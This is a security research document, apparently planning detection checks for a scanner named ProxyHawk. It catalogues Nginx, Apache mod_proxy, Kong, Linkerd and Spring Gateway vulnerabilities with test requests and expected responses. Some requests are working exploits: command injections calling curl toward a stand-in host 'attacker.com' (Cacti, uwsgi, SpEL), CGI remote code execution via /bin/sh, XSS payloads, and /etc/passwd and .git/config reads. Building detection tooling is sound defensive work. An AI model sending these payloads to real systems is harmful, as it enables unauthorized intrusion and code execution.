# Proxy Vulnerabilities Research

Comprehensive documentation of proxy-related vulnerabilities for implementation in ProxyHawk security testing tool.

**Research Date:** 2026-02-09
**Status:** Production Ready
**Priority:** High

---

## Table of Contents

1. [Nginx + Kubernetes Ingress Vulnerabilities](#1-nginx--kubernetes-ingress-vulnerabilities)
2. [Nginx proxy_pass SSRF Vulnerabilities](#2-nginx-proxy_pass-ssrf-vulnerabilities)
3. [Apache mod_proxy Vulnerabilities](#3-apache-mod_proxy-vulnerabilities)
4. [Kong API Gateway Vulnerabilities](#4-kong-api-gateway-vulnerabilities)
5. [Additional Proxy Misconfiguration Patterns](#5-additional-proxy-misconfiguration-patterns)
6. [Implementation Recommendations](#6-implementation-recommendations)

---

## 1. Nginx + Kubernetes Ingress Vulnerabilities

### 1.1 Nginx Off-by-Slash Path Traversal

**Vulnerability Name:** Nginx Alias Traversal / Off-by-Slash
**CVE:** N/A (Configuration Issue)
**Severity:** Medium (CVSS: 5.3)
**CWE:** CWE-200 (Exposure of Sensitive Information)

#### Technical Description

When Nginx `alias` directive is misconfigured without a trailing slash, it allows path traversal to access files outside the intended directory. The vulnerability occurs when:

```nginx
# VULNERABLE CONFIGURATION
location /static {
    alias /var/www/static;  # Missing trailing slash
}

# SECURE CONFIGURATION
location /static/ {
    alias /var/www/static/;  # Correct trailing slash
}
```

The missing slash allows requests like `/static../.git/config` to traverse outside the intended directory.

#### HTTP Test Requests

```http
GET /static../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /js../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /images../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /assets../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /css../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /content../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /media../.git/config HTTP/1.1
Host: target.com
Accept: */*

GET /lib../.git/config HTTP/1.1
Host: target.com
Accept: */*
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/plain
Content-Length: 92

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
```

#### Indicators of Vulnerability

- HTTP 200 status code
- Response body contains `[core]` section from Git config
- `Content-Type: text/plain` or `application/octet-stream`

#### Example Payloads

Common paths to test:
- `/static../.git/config`
- `/api../.env`
- `/assets../composer.json`
- `/images../package.json`
- `/js../web.config`
- `/css../phpinfo.php`

---

### 1.2 Kubernetes API Exposure via Ingress Headers

**Vulnerability Name:** Kubernetes API Authentication Bypass via Proxy Headers
**CVE:** CVE-2019-11248 (Debug Endpoint Exposure)
**Severity:** High (CVSS: 8.2)
**CWE:** CWE-862 (Missing Authorization)

#### Technical Description

Nginx ingress controllers can be misconfigured to expose Kubernetes API endpoints through header manipulation. Headers like `X-Original-URL`, `X-Rewrite-URL`, or path normalization issues can bypass authentication checks and access internal Kubernetes services.

The vulnerability occurs when:
1. Nginx ingress trusts client-supplied headers without validation
2. Backend services (like Kubernetes API) use these headers for routing decisions
3. Authentication checks are performed before header processing

#### HTTP Test Requests

```http
# Test 1: X-Original-URL Header Bypass
GET / HTTP/1.1
Host: kubernetes.target.com
X-Original-URL: /api/v1/namespaces
X-Rewrite-URL: /api/v1/namespaces
Accept: application/json

# Test 2: Path Normalization Bypass
GET /api/hassio/app/.%252e/supervisor/info HTTP/1.1
Host: kubernetes.target.com
Accept: application/json

# Test 3: Alternative Encoding Bypass
GET /api/hassio/app/.%09./supervisor/info HTTP/1.1
Host: kubernetes.target.com
X-Hass-Is-Admin: 1
Accept: application/json

# Test 4: Debug Endpoint Exposure
GET /debug/pprof/ HTTP/1.1
Host: kubernetes.target.com
Accept: text/html

# Test 5: Kubernetes API Direct Access
GET /api/v1/pods HTTP/1.1
Host: kubernetes.target.com
Accept: application/json

# Test 6: Namespace Enumeration
GET /api/v1/namespaces/default/pods HTTP/1.1
Host: kubernetes.target.com
Accept: application/json
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Content-Type: application/json
Server: nginx/1.19.0

{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "123456"
  },
  "items": [
    {
      "metadata": {
        "name": "nginx-deployment-abc123",
        "namespace": "default"
      },
      "spec": { ... },
      "status": { ... }
    }
  ]
}
```

#### Indicators of Vulnerability

- HTTP 200 status with Kubernetes API JSON response
- Response contains `"kind"`, `"apiVersion"`, `"metadata"` fields
- Access to `/debug/pprof/` shows "Types of profiles available:"
- Unauthorized access to pod, deployment, or namespace information

---

## 2. Nginx proxy_pass SSRF Vulnerabilities

### 2.1 Nginx Proxy SSRF via Misconfigured proxy_pass

**Vulnerability Name:** Nginx proxy_pass SSRF
**CVE:** N/A (Configuration Issue)
**Severity:** High
**CWE:** CWE-918 (Server-Side Request Forgery)

#### Technical Description

When Nginx `proxy_pass` directive is configured without proper input validation, attackers can manipulate the proxied URL to access internal resources. The vulnerability occurs when:

```nginx
# VULNERABLE CONFIGURATION
location /proxy/ {
    proxy_pass http://$arg_url;  # User-controlled URL
}

# OR
location ~ ^/proxy/(.*)$ {
    proxy_pass http://backend/$1;  # Insufficient validation
}
```

#### HTTP Test Requests

```http
# Test 1: Internal Network Access
GET /proxy/?url=http://127.0.0.1:6379/ HTTP/1.1
Host: target.com
Accept: */*

# Test 2: Cloud Metadata Access
GET /proxy/?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
Accept: */*

# Test 3: Internal Service Discovery
GET /proxy/?url=http://localhost:9200/_cluster/health HTTP/1.1
Host: target.com
Accept: */*

# Test 4: File Protocol (if enabled)
GET /proxy/?url=file:///etc/passwd HTTP/1.1
Host: target.com
Accept: */*

# Test 5: Port Scanning
GET /proxy/?url=http://10.0.0.1:22/ HTTP/1.1
Host: target.com
Accept: */*
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html

# Redis response
-DENIED Redis is running in protected mode...

# OR Cloud metadata response
{
  "ami-id": "ami-0123456789abcdef0",
  "instance-id": "i-0123456789abcdef0",
  "instance-type": "t2.micro"
}

# OR Elasticsearch response
{
  "cluster_name": "elasticsearch",
  "status": "green"
}
```

#### Indicators of Vulnerability

- Access to internal services (Redis, Elasticsearch, databases)
- Cloud metadata endpoints return valid data
- Internal IP addresses respond through proxy
- Port scanning reveals open internal ports

---

## 3. Apache mod_proxy Vulnerabilities

### 3.1 CVE-2021-40438: Apache mod_proxy SSRF

**Vulnerability Name:** Apache HTTP Server mod_proxy SSRF
**CVE:** CVE-2021-40438
**Severity:** Critical (CVSS: 9.0)
**CWE:** CWE-918 (Server-Side Request Forgery)
**Affected Versions:** Apache <= 2.4.48

#### Technical Description

Apache 2.4.48 and below contain a vulnerability where the uri-path can cause mod_proxy to forward requests to an origin server chosen by the remote user. The vulnerability exists in how mod_proxy processes URLs with Unix socket notation combined with HTTP URLs.

#### HTTP Test Requests

```http
# Test 1: Basic SSRF with OAST (Out-of-Band Application Security Testing)
GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAA...[7701 A's]...AAAAA|http://collaborator.example.com/ HTTP/1.1
Host: target.com
Accept: */*

# Test 2: Internal Service Access
GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAA...[7701 A's]...AAAAA|http://127.0.0.1:6379/ HTTP/1.1
Host: target.com
Accept: */*

# Test 3: Cloud Metadata Access
GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAA...[7701 A's]...AAAAA|http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
Accept: */*
```

#### Expected Vulnerable Response

**Successful SSRF (via Interactsh/Collaborator):**

```http
HTTP/1.1 200 OK
Server: oast
X-Interactsh-Version: 1.0.0
Content-Type: text/html

# Response from attacker's OAST server indicating DNS/HTTP callback
```

**Internal Service Access:**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.48
Content-Type: text/plain

# Response from internal Redis/service
```

#### Indicators of Vulnerability

- HTTP callback to attacker-controlled server (OAST)
- DNS query to attacker-controlled domain
- Response contains `X-Interactsh-Version` header
- Access to internal services (127.0.0.1, 169.254.169.254)

#### Remediation

Upgrade to Apache 2.4.49 or later.

---

### 3.2 CVE-2020-11984: Apache mod_proxy_uwsgi RCE

**Vulnerability Name:** Apache HTTP Server mod_proxy_uwsgi Buffer Overflow RCE
**CVE:** CVE-2020-11984
**Severity:** Critical (CVSS: 9.8)
**CWE:** CWE-120 (Buffer Overflow)
**Affected Versions:** Apache 2.4.32 - 2.4.44

#### Technical Description

Apache mod_proxy_uwsgi contains a buffer overflow vulnerability that allows remote code execution. The vulnerability exists in how the module handles uwsgi protocol requests, allowing attackers to craft malicious requests that overflow buffers and execute arbitrary code.

#### HTTP Test Requests

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

[uwsgi binary payload with overflow]
# Binary payload structure:
# 0x00 0x72 0x00 0x0a - uwsgi packet header
# UWSGI_FILE variable with exec://curl attacker.com payload
# SCRIPT_NAME variable
```

**Decoded payload structure:**
```
UWSGI_FILE: exec://curl attacker.com; echo ""
SCRIPT_NAME: /penetrate
```

#### Expected Vulnerable Response

**RCE Successful (via OAST):**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.43

# HTTP callback from curl command with User-Agent: curl/*
```

#### Indicators of Vulnerability

- HTTP/DNS callback to attacker server
- `User-Agent: curl/*` in OAST logs
- Command execution evidence in server response

#### Remediation

Upgrade to Apache 2.4.45 or later.

---

### 3.3 CVE-2019-10092: Apache mod_proxy Error Page XSS

**Vulnerability Name:** Apache mod_proxy Error Page HTML Injection/XSS
**CVE:** CVE-2019-10092
**Severity:** Medium (CVSS: 6.1)
**CWE:** CWE-79 (Cross-Site Scripting)
**Affected Versions:** Apache 2.4.0 - 2.4.39

#### Technical Description

Apache mod_proxy error page is vulnerable to limited cross-site scripting. An attacker can manipulate the link on the error page to point to an attacker-controlled page. This only affects servers with proxying enabled but misconfigured to display the proxy error page.

#### HTTP Test Requests

```http
# Test 1: Backslash Injection
GET /\google.com/evil.html HTTP/1.1
Host: target.com
Accept: text/html

# Test 2: Encoded Backslash
GET /%5cgoogle.com/evil.html HTTP/1.1
Host: target.com
Accept: text/html

# Test 3: XSS Payload in Path
GET /\attacker.com/"><script>alert(document.domain)</script> HTTP/1.1
Host: target.com
Accept: text/html
```

#### Expected Vulnerable Response

```http
HTTP/1.1 502 Bad Gateway
Server: Apache/2.4.39
Content-Type: text/html

<html>
<head><title>502 Proxy Error</title></head>
<body>
<h1>Proxy Error</h1>
<p>The proxy server could not handle the request</p>
<p>Reason: <strong>Error reading from remote server</strong></p>
<p>Additionally, a 502 Bad Gateway error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.39 Server at target.com Port 443</address>
<a href="/\google.com/evil.html">Retry</a>
</body>
</html>
```

#### Indicators of Vulnerability

- Error page contains malformed link with backslash
- Link href matches injected path: `<a href="/\google.com/evil.html">`
- Response contains "Proxy Error" message

#### Remediation

Upgrade to Apache 2.4.40 or later.

---

### 3.4 CVE-2021-41773: Apache Path Traversal and RCE

**Vulnerability Name:** Apache HTTP Server Path Traversal and Remote Code Execution
**CVE:** CVE-2021-41773
**Severity:** High (CVSS: 7.5)
**CWE:** CWE-22 (Path Traversal)
**Affected Versions:** Apache 2.4.49 only

#### Technical Description

Apache 2.4.49 introduced a vulnerability in path normalization that allows path traversal attacks. Attackers can map URLs to files outside the document root and potentially execute CGI scripts for remote code execution.

#### HTTP Test Requests

```http
# Test 1: Path Traversal - /etc/passwd
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: target.com
Accept: */*

# Test 2: CGI Path Traversal
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: target.com
Accept: */*

# Test 3: Remote Code Execution via CGI
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

echo Content-Type: text/plain; echo; echo TEST123 | rev
```

#### Expected Vulnerable Response

**Path Traversal:**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.49
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Remote Code Execution:**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.49
Content-Type: text/plain

321TSET
```

#### Indicators of Vulnerability

- HTTP 200 status with file contents
- Response contains `root:.*:0:0:` pattern for /etc/passwd
- Command output appears in response (reversed "TEST123" = "321TSET")

#### Remediation

Upgrade to Apache 2.4.50 or later (Note: 2.4.50 had incomplete fix, use 2.4.51+).

---

### 3.5 CVE-2024-38473: Apache mod_proxy ACL Bypass

**Vulnerability Name:** Apache HTTP Server mod_proxy ACL Bypass via Path Normalization
**CVE:** CVE-2024-38473
**Severity:** High (CVSS: 8.1)
**CWE:** CWE-116 (Improper Encoding or Escaping)
**Affected Versions:** Apache <= 2.4.59

#### Technical Description

Encoding problems in mod_proxy allow request URLs with incorrect encoding to bypass authentication and ACL restrictions. This is part of Orange Tsai's 2024 "Confusion Attacks" research on Apache HTTP Server.

The vulnerability exploits:
1. **Path Normalization ACL Bypass** - Adding `%3f` (encoded `?`) to bypass 403 restrictions
2. **DocumentRoot Confusion** - Escaping DocumentRoot to access files outside intended directory

#### HTTP Test Requests

```http
# Test 1: ACL Bypass - Protected Admin File
GET /admin.php HTTP/1.1
Host: target.com
Accept: */*

# Expected: 403 Forbidden
# Then test with bypass:

GET /admin.php%3ftest.php HTTP/1.1
Host: target.com
Accept: */*

# Expected: 200 OK if vulnerable

# Test 2: ACL Bypass - Other Protected Files
GET /adminer.php%3ftest.php HTTP/1.1
Host: target.com
Accept: */*

GET /xmlrpc.php%3ftest.php HTTP/1.1
Host: target.com
Accept: */*

GET /.env%3ftest.php HTTP/1.1
Host: target.com
Accept: */*

# Test 3: DocumentRoot Confusion
GET /html/usr/share/doc/hostname/copyright%3f HTTP/1.1
Host: target.com
Accept: */*
```

#### Expected Vulnerable Response

**ACL Bypass:**

```http
# First request returns:
HTTP/1.1 403 Forbidden
Server: Apache/2.4.59

# Bypass request returns:
HTTP/1.1 200 OK
Server: Apache/2.4.59
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
...
```

**DocumentRoot Confusion:**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.59
Content-Type: text/plain

This package was written by Peter Tobias
...
On Debian systems, the complete text of the GNU General Public License
can be found in /usr/share/common-licenses/GPL.
```

#### Indicators of Vulnerability

1. File returns 403 without bypass, 200 with `%3f` suffix
2. Access to files outside DocumentRoot
3. Ability to read system files through path manipulation

#### Remediation

Upgrade to Apache 2.4.60 or later.

---

## 4. Kong API Gateway Vulnerabilities

### 4.1 Kong Manager Exposure

**Vulnerability Name:** Kong Manager Admin Panel Exposure
**CVE:** N/A (Misconfiguration)
**Severity:** High
**CWE:** CWE-200 (Information Disclosure)

#### Technical Description

Kong Manager provides a GUI for managing Kong Gateway. When exposed without authentication, it allows unauthorized access to API routes, consumers, plugins, and sensitive configuration.

#### HTTP Test Requests

```http
# Test 1: Kong Manager Panel Detection
GET / HTTP/1.1
Host: kong.target.com
Accept: text/html

# Test 2: Kong Admin API Access
GET /admin/api HTTP/1.1
Host: kong.target.com
Accept: application/json

# Test 3: Kong Status Endpoint
GET /status HTTP/1.1
Host: kong.target.com
Accept: application/json

# Test 4: Kong Routes Enumeration
GET /routes HTTP/1.1
Host: kong.target.com
Accept: application/json

# Test 5: Kong Services List
GET /services HTTP/1.1
Host: kong.target.com
Accept: application/json

# Test 6: Kong Consumers List
GET /consumers HTTP/1.1
Host: kong.target.com
Accept: application/json
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Server: kong/3.4.0
Content-Type: application/json

{
  "data": [
    {
      "id": "4506673d-c825-444c-a25b-602e3c2ec16e",
      "name": "example-route",
      "paths": ["/api/v1"],
      "service": {
        "id": "bd380f99-659d-415e-b0e7-72ea05df3218"
      }
    }
  ],
  "next": null
}
```

#### Indicators of Vulnerability

- HTTP 200 with Kong admin API responses
- `Server: kong/*` header
- JSON responses with route/service/consumer data
- Access to configuration endpoints without authentication

---

### 4.2 Konga Admin Panel Exposure

**Vulnerability Name:** Konga Management Dashboard Exposure
**CVE:** N/A (Misconfiguration)
**Severity:** High
**CWE:** CWE-306 (Missing Authentication)

#### Technical Description

Konga is a popular open-source Kong Admin GUI. When deployed without authentication, it exposes complete Kong configuration management.

#### HTTP Test Requests

```http
GET /login HTTP/1.1
Host: konga.target.com
Accept: text/html

GET / HTTP/1.1
Host: konga.target.com
Accept: text/html

GET /api/nodes HTTP/1.1
Host: konga.target.com
Accept: application/json
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html ng-app="app">
  <head>
    <title>Konga</title>
    ...
```

#### Indicators of Vulnerability

- Konga login panel accessible
- `ng-app="app"` in HTML (Angular app)
- Access to `/api/nodes` endpoint returns Kong connection information

---

## 5. Additional Proxy Misconfiguration Patterns

### 5.1 Open Proxy to Localhost

**Vulnerability Name:** Open Proxy to Internal Ports
**CVE:** N/A (Misconfiguration)
**Severity:** High (CVSS: 8.6)
**CWE:** CWE-441 (Unintended Proxy/Intermediary)

#### Technical Description

Misconfigured proxies allow access to internal services via localhost/127.0.0.1 interface. This can expose internal web applications, databases, monitoring systems, and other services not intended for external access.

#### HTTP Test Requests

```http
# Test 1: Baseline - Normal Request
GET / HTTP/1.1
Host: target.com

# Test 2: Proxy Test - Nonexistent Domain
GET http://somethingthatdoesnotexist/ HTTP/1.1
Host: somethingthatdoesnotexist

# Test 3: Localhost HTTP Access
GET http://127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

# Test 4: Localhost HTTPS Access
GET https://127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

# Test 5: Localhost via Hostname
GET http://localhost/ HTTP/1.1
Host: localhost

# Test 6: Localhost HTTPS via Hostname
GET https://localhost/ HTTP/1.1
Host: localhost

# Test 7: Internal Port Scanning
GET http://127.0.0.1:8080/ HTTP/1.1
Host: 127.0.0.1:8080

GET http://127.0.0.1:9200/ HTTP/1.1
Host: 127.0.0.1:9200

GET http://127.0.0.1:6379/ HTTP/1.1
Host: 127.0.0.1:6379
```

#### Expected Vulnerable Response

```http
# IIS Detection
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0

<html>
<head><title>IIS7</title></head>
<body>
<h1>IIS Windows Server</h1>
</body>
</html>

# Apache Detection
HTTP/1.1 200 OK
Server: Apache/2.4.41

<html>
<body><h1>It works!</h1></body>
</html>

# Elasticsearch Detection
HTTP/1.1 200 OK
Content-Type: application/json

{
  "name" : "elasticsearch-node",
  "cluster_name" : "elasticsearch"
}
```

#### Indicators of Vulnerability

Compare responses:
- Request 1 (baseline) != Internal service default pages
- Request 2 (nonexistent) != Internal service default pages
- Requests 3-6 == Internal service default pages

Fingerprints:
- `<title>IIS7</title>`
- `"503 Service Unavailable"` (Nginx default)
- `"default welcome page"` (Apache)
- `"Welcome to IIS"` / `"Welcome to Windows"`
- `"It works"` (Apache default)
- `"Microsoft Azure App"`

---

### 5.2 X-Forwarded-For 403 Bypass

**Vulnerability Name:** 403 Forbidden Bypass via X-Forwarded-For
**CVE:** N/A (Misconfiguration)
**Severity:** Info/Low
**CWE:** CWE-863 (Incorrect Authorization)

#### Technical Description

Applications behind Nginx/Apache proxies may implement IP-based access control using `X-Forwarded-For` header. If not properly validated, attackers can bypass 403 restrictions by spoofing internal IP addresses.

#### HTTP Test Requests

```http
# Test 1: Baseline - No Headers
GET / HTTP/1.1
Host: target.com
Accept: */*

# Expected: 403 Forbidden

# Test 2: X-Forwarded-For Bypass
GET / HTTP/1.1
Host: target.com
Accept: */*
X-Forwarded-For: 127.0.0.1

# OR Multiple IPs
GET / HTTP/1.1
Host: target.com
Accept: */*
X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1

# Test 3: Other Headers
GET / HTTP/1.1
Host: target.com
Accept: */*
X-Real-IP: 127.0.0.1
X-Forwarded-Host: localhost
X-Forwarded-Proto: https
```

#### Expected Vulnerable Response

```http
# First request:
HTTP/1.1 403 Forbidden
Server: nginx/1.18.0

# Second request (bypass):
HTTP/1.1 200 OK
Server: nginx/1.18.0

<!DOCTYPE html>
<html>
...access granted...
```

#### Indicators of Vulnerability

- First request returns 403
- Request with `X-Forwarded-For: 127.0.0.1` returns 200
- Application trusts client-supplied proxy headers

---

### 5.3 Web Cache Poisoning

**Vulnerability Name:** Web Cache Poisoning via Unkeyed Headers
**CVE:** N/A (Design Flaw)
**Severity:** Low to Medium
**CWE:** CWE-444 (HTTP Request Smuggling)

#### Technical Description

Web caches use "cache keys" (typically URL + Host) to store responses. If applications reflect unkeyed headers (headers not included in cache key) in responses, attackers can poison the cache to serve malicious content to all users.

Common unkeyed headers:
- `X-Forwarded-Host`
- `X-Forwarded-Proto`
- `X-Forwarded-Prefix`
- `X-Forwarded-For`
- `X-Original-URL`
- Custom application headers

#### HTTP Test Requests

```http
# Test 1: Poisoning Request
GET /?cachebuster=123456 HTTP/1.1
Host: target.com
X-Forwarded-Prefix: evil.xfp
X-Forwarded-Host: evil.xfh
X-Forwarded-For: evil.xff

# Test 2: Verify Poisoned Cache
GET /?cachebuster=123456 HTTP/1.1
Host: target.com

# Test 3: Alternative Headers
GET /?test=987654 HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

#### Expected Vulnerable Response

**First Request (Poisoning):**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Cache: MISS
Cache-Control: public, max-age=3600

<html>
<head>
  <link rel="stylesheet" href="//evil.xfh/style.css">
</head>
...
```

**Second Request (Poisoned Cache Served):**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Cache: HIT
Age: 5

<html>
<head>
  <link rel="stylesheet" href="//evil.xfh/style.css">
</head>
...
```

#### Indicators of Vulnerability

- Unkeyed header value (`evil.xfh`) appears in cached response
- Second request (without poisoning headers) returns same tainted response
- `X-Cache: HIT` or `Age:` header indicates cached response
- Response contains injected domain/value in links, scripts, or content

---

### 5.4 X-Forwarded-For Header Injection (Cacti CVE-2022-46169)

**Vulnerability Name:** Remote Command Injection via X-Forwarded-For Bypass
**CVE:** CVE-2022-46169
**Severity:** Critical (CVSS: 9.8)
**CWE:** CWE-78 (OS Command Injection)

#### Technical Description

Cacti (network monitoring tool) through version 1.2.22 has insufficient authorization in the remote agent when handling requests with `X-Forwarded-For` header. Attackers can bypass authentication and inject OS commands.

#### HTTP Test Requests

```http
GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;curl%20attacker.com%20-H%20'User-Agent%3a%20TEST123'; HTTP/1.1
Host: cacti.target.com
X-Forwarded-For: 127.0.0.1
Accept: */*
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: application/json

{
  "value": "...",
  "local_data_id": "1"
}

# Plus HTTP callback to attacker.com with User-Agent: TEST123
```

#### Indicators of Vulnerability

- HTTP 200 with JSON response containing `"value"` and `"local_data_id"`
- HTTP callback to attacker server
- Custom User-Agent in OAST logs confirms RCE

---

### 5.5 Linkerd SSRF via l5d-dtab Header

**Vulnerability Name:** Linkerd SSRF via l5d-dtab Header
**CVE:** N/A (Feature Misuse)
**Severity:** High
**CWE:** CWE-918 (SSRF)

#### Technical Description

Linkerd service mesh uses the `l5d-dtab` header for dynamic routing. When improperly configured, this header allows attackers to redirect requests to arbitrary internal/external services, enabling SSRF attacks.

#### HTTP Test Requests

```http
GET / HTTP/1.1
Host: target.com
l5d-dtab: /svc/* => /$/inet/attacker.com/443
Accept: */*

GET /api/internal HTTP/1.1
Host: target.com
l5d-dtab: /svc/* => /$/inet/169.254.169.254/80
Accept: */*
```

#### Expected Vulnerable Response

```http
# HTTP callback to attacker.com indicates SSRF
# OR access to cloud metadata:

HTTP/1.1 200 OK

ami-id
ami-launch-index
ami-manifest-path
...
```

#### Indicators of Vulnerability

- HTTP/DNS callback to attacker server
- Access to internal services via routing manipulation
- Response from cloud metadata endpoints

---

### 5.6 Spring Boot Gateway Actuator SSRF

**Vulnerability Name:** Spring Cloud Gateway Actuator SSRF
**CVE:** N/A (Feature Misuse)
**Severity:** Medium
**CWE:** CWE-200 (Information Disclosure) / CWE-918 (SSRF)

#### Technical Description

Spring Cloud Gateway exposes `/actuator/gateway/routes` endpoint that can leak sensitive environment variables and enable SSRF through SpEL (Spring Expression Language) injection.

#### HTTP Test Requests

```http
# Test 1: Route Discovery
GET /gateway/routes HTTP/1.1
Host: target.com
Accept: application/json

# Test 2: Actuator Endpoint
GET /actuator/gateway/routes HTTP/1.1
Host: target.com
Accept: application/json

# Test 3: SpEL Injection (if writable)
POST /actuator/gateway/routes/test HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "id": "test",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0": "/test"}
  }],
  "filters": [{
    "name": "RewritePath",
    "args": {
      "_genkey_0": "/test",
      "_genkey_1": "#{T(java.lang.Runtime).getRuntime().exec('curl attacker.com')}"
    }
  }],
  "uri": "http://example.com"
}
```

#### Expected Vulnerable Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

[
  {
    "route_id": "service-1",
    "predicate": "Paths: [/api/**]",
    "filters": ["RewritePath", "AddRequestHeader"],
    "uri": "http://backend-service:8080",
    "order": 0
  }
]
```

#### Indicators of Vulnerability

- Exposed gateway routes configuration
- Response contains `"predicate"`, `"route_id"`, `"uri"` fields
- Sensitive URLs, credentials, or internal service locations visible
- SpEL injection leads to RCE (HTTP callback to attacker)

---

## 6. Implementation Recommendations

### 6.1 ProxyHawk Integration Architecture

```go
// Suggested structure for internal/proxy/advanced_checks.go

type ProxyVulnCheck struct {
    Name        string
    CVE         string
    Severity    string
    Category    string // nginx, apache, kong, misc
    CheckFunc   func(*ProxyChecker, *http.Client, string) (*SecurityCheckResult, error)
}

var ProxyVulnerabilityChecks = []ProxyVulnCheck{
    {
        Name:     "Nginx Off-by-Slash Path Traversal",
        Severity: "medium",
        Category: "nginx",
        CheckFunc: checkNginxOffBySlash,
    },
    {
        Name:     "Apache mod_proxy SSRF (CVE-2021-40438)",
        CVE:      "CVE-2021-40438",
        Severity: "critical",
        Category: "apache",
        CheckFunc: checkApacheModProxySSRF,
    },
    // ... additional checks
}
```

### 6.2 Detection Priorities

**Priority 1 (Critical - Implement First):**
1. CVE-2021-40438: Apache mod_proxy SSRF
2. CVE-2020-11984: Apache mod_proxy_uwsgi RCE
3. CVE-2024-38473: Apache mod_proxy ACL Bypass
4. Open Proxy to Localhost (Internal Network Access)
5. Kong Manager Exposure

**Priority 2 (High - Implement Second):**
6. Nginx Off-by-Slash Path Traversal
7. Kubernetes API Exposure via Headers
8. CVE-2021-41773: Apache Path Traversal
9. Linkerd SSRF via l5d-dtab
10. Spring Boot Gateway Actuator

**Priority 3 (Medium - Implement Third):**
11. X-Forwarded-For 403 Bypass
12. Web Cache Poisoning
13. CVE-2019-10092: Apache mod_proxy XSS
14. Nginx proxy_pass SSRF (Generic)

### 6.3 Configuration File Updates

Add to `config/default.yaml`:

```yaml
advanced_checks:
  proxy_vulnerabilities:
    enabled: true

    # Nginx checks
    nginx_off_by_slash:
      enabled: true
      paths:
        - "/static../.git/config"
        - "/js../.git/config"
        - "/images../.git/config"
        - "/assets../.git/config"
        - "/css../.git/config"
        - "/content../.git/config"
        - "/media../.git/config"
        - "/lib../.git/config"

    nginx_k8s_ingress:
      enabled: true
      headers:
        - "X-Original-URL"
        - "X-Rewrite-URL"
      endpoints:
        - "/api/v1/pods"
        - "/api/v1/namespaces"
        - "/debug/pprof/"

    # Apache checks
    apache_mod_proxy_ssrf:
      enabled: true
      cve: "CVE-2021-40438"
      use_oast: true  # Requires Interactsh

    apache_mod_proxy_rce:
      enabled: true
      cve: "CVE-2020-11984"
      use_oast: true

    apache_path_traversal:
      enabled: true
      cve: "CVE-2021-41773"
      paths:
        - "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        - "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

    apache_acl_bypass:
      enabled: true
      cve: "CVE-2024-38473"
      test_files:
        - "admin.php"
        - "adminer.php"
        - "xmlrpc.php"
        - ".env"

    # Kong checks
    kong_manager_exposure:
      enabled: true
      endpoints:
        - "/"
        - "/admin/api"
        - "/routes"
        - "/services"
        - "/consumers"

    # Generic proxy checks
    open_proxy_localhost:
      enabled: true
      test_ports:
        - 80
        - 443
        - 8080
        - 9200
        - 6379

    xff_403_bypass:
      enabled: true
      headers:
        - "X-Forwarded-For: 127.0.0.1"
        - "X-Real-IP: 127.0.0.1"
        - "X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1"

    cache_poisoning:
      enabled: true
      headers:
        - "X-Forwarded-Host"
        - "X-Forwarded-Prefix"
        - "X-Forwarded-Proto"

    linkerd_ssrf:
      enabled: true
      use_oast: true

    spring_gateway_actuator:
      enabled: true
      endpoints:
        - "/gateway/routes"
        - "/actuator/gateway/routes"
```

### 6.4 Testing Strategy

1. **Passive Detection:**
   - Server header analysis (`Server: nginx`, `Server: Apache`, `Server: kong`)
   - Technology fingerprinting (detect Kong, Spring Boot, etc.)
   - Response header analysis

